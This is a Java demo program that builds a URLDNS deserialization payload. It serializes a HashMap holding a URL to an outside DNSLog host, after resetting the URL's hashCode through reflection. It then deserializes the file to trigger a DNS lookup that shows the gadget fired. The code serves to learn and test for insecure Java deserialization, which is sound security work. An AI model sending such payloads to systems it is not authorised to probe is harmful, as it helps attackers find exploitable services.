import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.util.HashMap;
import java.lang.reflect.Field;

public class URLDNSDemo {
    public static void main(String[] args) throws IOException,ClassNotFoundException,IllegalAccessException,NoSuchFieldException{
        
        URL url=new URL("http://7170d6dad4.ddns.1433.eu.org");
        HashMap<URL, String> hmp=new HashMap<>();
        hmp.put(url, "test");

        Field f=URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url,-1);

        FileOutputStream fos=new FileOutputStream("payload.ser");
        ObjectOutputStream oos=new ObjectOutputStream(fos);
        oos.writeObject(hmp);
        oos.close();
        fos.close();
        System.out.println("Payload created: payload.ser");
        System.out.println("sizeof" + "payload.ser: " + new java.io.File("payload.ser").length() + " bytes");

        FileInputStream fis=new FileInputStream("payload.ser");
        ObjectInputStream ois=new ObjectInputStream(fis);
        ois.readObject();
        ois.close();
        fis.close();

        System.out.println("Check your DNSLog platform for the incoming request when deserializing this payload.");
    }

}
